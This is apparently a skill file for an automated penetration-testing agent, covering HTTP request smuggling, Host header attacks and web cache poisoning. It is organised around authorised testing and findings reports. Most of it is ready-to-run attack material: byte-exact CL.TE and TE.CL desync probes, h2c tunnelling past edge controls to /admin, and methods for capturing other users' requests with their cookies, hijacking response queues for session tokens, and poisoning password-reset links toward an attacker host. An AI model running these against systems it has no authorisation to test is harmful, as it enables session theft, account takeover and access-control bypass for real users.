---
name: request-smuggling-testing
description: Detect and exploit HTTP request smuggling / desync (CL.TE, TE.CL, TE.TE, H2.CL/H2.TE downgrade), HTTP Host header attacks (password-reset poisoning, routing SSRF, auth bypass), and web cache poisoning/deception against front-end->back-end chains (CDN/LB/reverse proxy -> origin). Use whenever a target sits behind any intermediary, when responses show Via/X-Cache/CDN headers, or when WSTG-INPV coverage requires CWE-444 testing.
license: Apache-2.0
metadata:
  author: Section9Labs
  version: "1.0"
  wstg: "WSTG-INPV"
  cwe: "CWE-444"
---

# HTTP Request Smuggling / Desync, Host Header Attacks, Cache Poisoning

Desync bugs live in the *disagreement* between two HTTP parsers in a chain. Everything
here requires sending raw, byte-exact requests — never a high-level client that
normalizes `Content-Length`, folds headers, or auto-chunks. Use `scripts/smuggle_probe.py`
(raw sockets), Burp Repeater with "Update Content-Length" **disabled** and HTTP/1
forced, or `openssl s_client -quiet -connect host:443`.

Full technique depth: `references/desync.md`. Host header and cache attacks:
`references/host-header-and-cache.md`. rupu output wiring (work units, assets, findings):
`references/rupu.md` — every parse/handoff step below ends in one of those outputs.

## 0. Recon — is there a chain to desync?

```
curl -skI https://example.com/ -o - | egrep -i 'via|x-cache|cf-ray|x-served-by|server|age|x-varnish|x-amz-cf'
```

- `Via`, `X-Cache`, `Age`, `X-Served-By`, `CF-Ray`, `X-Varnish`, `X-Amz-Cf-Id` => front-end exists; smuggling and cache poisoning are in play.
- Note HTTP version: `curl -skI --http2 -w '%{http_version}\n'`. If the edge speaks
  HTTP/2 but the origin is HTTP/1.1 (almost always), H2 downgrade desyncs apply.
- Record the site now: `assets.mark` kind `web:site`, depth `mapped` (see `references/rupu.md`).

## 1. Automated detection pass

**smuggler.py** (defparam):

```
python3 smuggler.py -u https://example.com
python3 smuggler.py -u https://example.com -m POST -v 1 -l smuggler.log
cat urls.txt | python3 smuggler.py            # stdin batch mode
```

Flags: `-m` method, `-v` verbosity, `-l` logfile, `-q` quiet, `-t` timeout,
`-x` exit on first finding, `-c` extra configfile of mutations. It permutes dozens of
`Transfer-Encoding` obfuscations and reports `[CL.TE]` / `[TE.CL]` lines with the exact
mutation name. A smuggler.py hit is a *candidate*, not a confirmation — timeouts from
flaky edges false-positive constantly. Always re-verify manually (step 2/3).

**Burp HTTP Request Smuggler** (BApp): run "Smuggle probe" on the base request; it
flags CL.TE/TE.CL/H2 issues in the issue pane and provides "Convert to launch" to turn
a probe into an attack request. Enable "HTTP/2 probing" for downgrade bugs. Turbo
Intruder (bundled engine) is what you use for the race-sensitive exploitation steps.

**h2csmuggler** (BishopFox) — HTTP/2 cleartext upgrade smuggling (bypasses front-end
entirely by upgrading the back-end connection to h2c and tunnelling arbitrary requests
past edge ACLs):

```
python3 h2csmuggler.py -x https://example.com/ --test          # is h2c upgrade proxied?
python3 h2csmuggler.py -x https://example.com/ https://example.com/admin   # tunnel request
python3 h2csmuggler.py -x https://example.com/ -i paths.txt    # batch
```

**Parse/handoff:** feed every candidate (smuggler.py mutation names, h2csmuggler
`--test` successes, Burp issues) into
`python3 scripts/smuggle_probe.py --url https://example.com --work-units candidates.json`
to normalize them into a work-units array; hand that file to the `work-units` skill /
a `for_each:` fan-out. Mark the site `tested` via `assets.mark`.

## 2. Manual detection — timing probes

Send with `scripts/smuggle_probe.py --send` (it measures elapsed time per probe and
compares to baseline) or raw Repeater. Exact byte sequences in `references/desync.md`.

**CL.TE timing probe** — front-end honors CL (forwards 4 bytes `1\r\nA`), back-end
honors TE and hangs waiting for the rest of the chunk:

```
POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX
```

Significant delay (back-end read timeout) vs. baseline => CL.TE likely.

**TE.CL timing probe** — front-end honors TE (forwards only up to the `0` chunk,
5 bytes), back-end honors CL=6 and waits for 1 more byte:

```
POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX
```

**Order matters:** always test CL.TE first. The TE.CL probe against a CL.TE system
poisons the socket and desyncs *other live users* before you intend to.

**TE.TE:** both ends support TE; obfuscate the header until exactly one side stops
seeing it, degrading to CL.TE or TE.CL. `smuggle_probe.py --probe tete` emits the
full mutation set (`xchunked`, `Transfer-Encoding : chunked`, tab/space variants,
duplicate headers, `chunked\r\nTransfer-encoding: cow`, vertical-tab, etc.).

```
python3 scripts/smuggle_probe.py --url https://example.com --probe all --send --baseline 3
```

Read the output: `DELAY` on CL.TE probe + normal TE.CL => CL.TE. `DELAY` on TE.CL
probe only => TE.CL. Delay only on one TE.TE mutation => note which mutation; that is
your working obfuscation for exploitation.

## 3. Confirmation — differential responses

Timing alone is not proof. Confirm by smuggling a prefix that visibly changes the
*next* request's response (PortSwigger method): smuggle `GET /404doesnotexist HTTP/1.1`
as the prefix, then immediately send a normal `GET /` on a **new connection** — if the
normal request returns 404, the back-end socket was poisoned. Full attack-request
construction (CL/TE arithmetic, chunk-size hex math for TE.CL) is worked through in
`references/desync.md`, and `smuggle_probe.py --probe confirm` builds the pair for you.
Repeat 5-10x: front-end connection pools mean your victim request may not land on the
poisoned socket every time.

**Parse/handoff:** a confirmed desync is reported immediately via the
`finding-report` skill / `findings.report`: scope `endpoint`, target_ref the probed
URL, severity **high** (critical if you demonstrate response-queue poisoning or
request capture), CWE-444 + WSTG-INPV, evidence = the exact raw attack request bytes
plus both the baseline and poisoned victim exchanges.
`smuggle_probe.py --finding-template finding.json` emits the payload skeleton. Mark
the route `exploited` with `assets.mark`.

## 4. Exploitation

Details and ready prefixes in `references/desync.md` §Exploitation. Headlines:

- **Front-end control bypass**: smuggle `GET /admin HTTP/1.1\r\nHost: localhost` past
  edge ACLs.
- **Request capture**: smuggle a prefix ending in an unclosed POST parameter to a
  storage endpoint (comment field, profile) — the victim's full request, cookies and
  auth headers included, is appended into stored content you can read back.
- **Reflected-XSS escalation**: smuggle a request carrying the XSS so it fires in the
  next victim's response — no interaction needed.
- **Response-queue poisoning**: desync the whole queue so you receive *other users'
  responses* (session tokens) — severity critical.
- **H2.CL / H2.TE**: on an HTTP/2 edge that downgrades, inject `content-length` or
  `transfer-encoding` into the H2 request (H2 ignores them; the downgraded HTTP/1.1
  back-end doesn't). Also CRLF-in-header-value injection (H2 headers are
  length-prefixed, so `\r\n` survives to the downgrade). Use Burp Request Smuggler's
  HTTP/2 probes; raw H2 needs a frame-level client.
- **h2c tunnel**: once `h2csmuggler --test` passes, every edge rule (path blocks,
  auth, WAF) is gone for the tunnelled connection.

## 5. Host header attacks

Methodology and payload set in `references/host-header-and-cache.md`. Sequence:

1. Baseline-diff mutations with curl: bogus `Host:`, duplicate `Host:`, absolute-URI
   + mismatched Host, `Host: example.com:443@evil`, and the override headers
   `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`,
   `Forwarded: host=...`.
2. **Password-reset poisoning**: trigger a reset with
   `X-Forwarded-Host: <interactsh-id>.oast.pro` (or attacker host); if the mailed link
   uses it, the token leaks on click. Run `interactsh-client -json -o oob.json` and
   watch for the callback — a DNS/HTTP hit on the interactsh id is your evidence.
3. **Routing-based SSRF**: `Host: 192.0.2.10` / internal names against a reverse proxy
   that routes on Host; confirm with interactsh (`Host: <id>.oast.pro`) then sweep
   internal ranges watching for response differentials.
4. **Auth bypass**: `Host: localhost` on `/admin`-type routes.

**Parse/handoff:** each behavioral difference becomes a work unit (route + mutated
header in `hints`); confirmed issues go to `findings.report` (CWE-644/CWE-918,
WSTG-INPV / WSTG-ATHZ as applicable) with the full request/response pair in evidence.

## 6. Web cache poisoning & deception

Method (detail in `references/host-header-and-cache.md`):

1. **Always use a cache buster** (`?cb=<random>`) so experiments never hit real users'
   cache entries until you intend to.
2. Find **unkeyed inputs**: Burp **Param Miner** -> "Guess headers" / "Guess everything"
   on the base request; it brute-forces ~2k header names and flags any that change the
   response. Classic hits: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`,
   `X-Original-URL`, `X-Forwarded-Port`.
3. Confirm unkeyed+reflected: send mutation with buster, then re-request the *same
   busted URL without the header* — if the injected value persists and `X-Cache: hit`,
   it's poisonable.
4. Exploit: reflected unkeyed host into script URLs => stored-XSS-equivalent;
   `X-Forwarded-Scheme: http` => cached redirect DoS; fat-GET / parameter cloaking
   where keys are normalized.
5. **Cache deception**: request `/account/settings/nonexistent.css` style path-confusion
   suffixes; if the cache keys on extension and the origin ignores the suffix, a
   victim's private page becomes publicly cached — fetch it back unauthenticated.

**Parse/handoff:** every unkeyed input found is a work unit; a confirmed poisoning is a
`findings.report` call — scope `endpoint`, severity high (it hits other users),
CWE-444 (poisoning via desync) or CWE-349/WSTG-ATHZ-style cache deception, evidence =
the poisoning request, the cached hit retrieved by a clean client, and `X-Cache`/`Age`
headers proving cache residence.

## Chain-out

- Reflected input found while probing => `xss` tooling (dalfox) on that param.
- Host-header SSRF confirmed => SSRF/interactsh exploitation skill for metadata targets.
- Every step's outputs land in rupu per `references/rupu.md`: work units for fan-out,
  `assets.mark` for coverage (`mapped`->`crawled`->`tested`->`exploited`),
  `findings.report` for anything confirmed, written via the `finding-report` skill.
